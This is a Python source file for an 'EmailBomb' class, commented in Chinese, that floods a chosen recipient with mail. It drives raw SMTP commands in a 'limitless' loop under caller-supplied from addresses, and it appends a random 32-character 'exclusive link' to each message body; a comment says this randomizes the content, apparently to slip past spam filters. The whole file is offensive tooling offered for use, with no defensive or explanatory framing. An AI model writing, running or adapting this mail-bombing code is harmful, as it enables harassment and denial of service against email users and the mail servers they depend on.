# -*- coding: utf-8 -*-
import Email
import random
import string
import time


class EmailBomb:
    def __init__(self, id, to_addr, from_addr, SMTP_addr="", port=25, timeout=10):
        self.notify_header = str(id)
        self.to_addr = to_addr
        self.from_addr = from_addr
        self.port = port
        self.timeout = timeout
        self.SMTP_addrs = [SMTP_addr] if SMTP_addr else []  # 必须为列表
        self.exit_flag = 1

        self.update_notify("")
        self.create()

    def update_notify(self, body):
        self.notify_body = body
        self.notify = self.notify_header+self.notify_body

    def create(self):
        self.emailer = Email.Email(
            to_addr=self.to_addr,
            from_addr=self.from_addr,
            SMTP_addrs=self.SMTP_addrs,
            port=self.port,
            timeout=self.timeout,
        )

    def limitless(self, subject, content):
        while self.exit_flag:
            self.attack(subject, content)

    def attack(self, subject, content):
        '''
        攻击启动
        '''

        # 建立连接
        while self.exit_flag:
            code, msg = self.emailer.Connect()
            if code:
                # 建立会话
                self.notify = "send ehlo"
                code, msg = self.emailer.Send(u"ehlo antispam")
                if code:
                    break

        self.update_notify("send mail from")
        while self.exit_flag:
            # 表明发件地址
            code, msg = self.emailer.Send(u"mail from:<%s>" % self.from_addr)
            if not code:
                continue

            self.update_notify("send rcpt to")
            # 表明收件地址
            code, msg = self.emailer.Send(u"rcpt to:<%s>" % self.to_addr)
            if code:
                break

            self.update_notify(msg)

        self.update_notify("send data")
        while self.exit_flag:
            # 信件具体内容
            code, msg = self.emailer.Send(u"data")
            if code:
                break

            self.update_notify(msg)

        self.update_notify("send to")
        while self.exit_flag:
            # to:
            code, msg = self.emailer.Send(u"to: %s" % self.to_addr, recv=False)
            if not code:
                self.update_notify(msg)
                continue

            # from:
            self.update_notify("send from")
            code, msg = self.emailer.Send(u"from: %s" % self.from_addr, recv=False)
            if not code:
                self.update_notify(msg)
                continue

            # subject:
            self.update_notify("send subject")
            code, msg = self.emailer.Send("subject: "+subject, recv=False)
            if not code:
                self.update_notify(msg)
                continue

            break  # 上面都发送成功

        # body:
        self.update_notify("send body")
        code, msg = self.emailer.Send(
            content+u"\r\n\r\n你的专属链接为："+"".join(
                random.choice(string.hexdigits)
                for i in range(32)
            )+"\r\n.\r\n",  # 随机化部分邮件内容

            check="250"  # 状态码为 250 说明发送成功
        )

        self.update_notify(msg)
        time.sleep(1)
